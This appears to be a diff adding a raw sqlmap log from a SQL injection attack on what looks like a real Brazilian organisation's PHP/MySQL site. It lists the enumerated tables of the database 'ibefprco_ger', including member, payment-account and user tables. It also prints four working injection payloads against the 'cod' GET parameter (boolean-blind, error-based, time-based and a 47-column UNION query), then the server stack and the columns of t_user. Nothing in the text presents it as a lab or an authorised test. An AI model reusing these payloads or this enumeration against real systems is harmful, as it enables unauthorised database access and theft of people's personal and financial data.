+| t_eventos                 |
+| t_gal_imagem              |
+| t_galeria                 |
+| t_galeria_eventos         |
+| t_galeria_eventos_imagem  |
+| t_google                  |
+| t_grupo_banner            |
+| t_inscritos               |
+| t_link                    |
+| t_menu                    |
+| t_meta_tag                |
+| t_noticias                |
+| t_noticias_clippings      |
+| t_noticias_isae           |
+| t_parceiros               |
+| t_patrocinadores          |
+| t_permissoes              |
+| t_premios                 |
+| t_regulamentos            |
+| t_revelacoes              |
+| t_revelacoes_candidatos   |
+| t_revelacoes_regulamentos |
+| t_revelacoes_votos        |
+| t_socios                  |
+| t_socios_atuacao          |
+| t_socios_contacorrente    |
+| t_socios_empresa          |
+| t_socios_especialista     |
+| t_socios_esporte          |
+| t_socios_evento_gostaria  |
+| t_socios_eventos          |
+| t_socios_filhos           |
+| t_socios_graduado         |
+| t_socios_idioma           |
+| t_socios_info             |
+| t_socios_nivel            |
+| t_socios_passatempo       |
+| t_socios_quest            |
+| t_socios_remuneracao      |
+| t_socios_trabalhos        |
+| t_socios_votacao          |
+| t_user                    |
+| t_videos                  |
+| t_votos                   |
++---------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cod (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: cod=(SELECT (CASE WHEN (1157=1157) THEN 112 ELSE (SELECT 3818 UNION SELECT 7995) END))
+    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: cod=112 AND (SELECT 2288 FROM(SELECT COUNT(*),CONCAT(0x7171717a71,(SELECT (ELT(2288=2288,1))),0x71627a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: cod=112 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 47 columns
+    Payload: cod=-7141 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7171717a71,0x44624b496b43554f4c554f70715274736b676f4b4d6b70524741554d786e65544248496670476178,0x71627a6b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- OVNW
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache, PHP 5.3.29
+back-end DBMS: MySQL >= 5.0
+Database: ibefprco_ger
+Table: t_user
+[1 column]
++----------+---------+
+| Column   | Type    |
++----------+---------+
+| user_cod | int(11) |
++----------+---------+
+
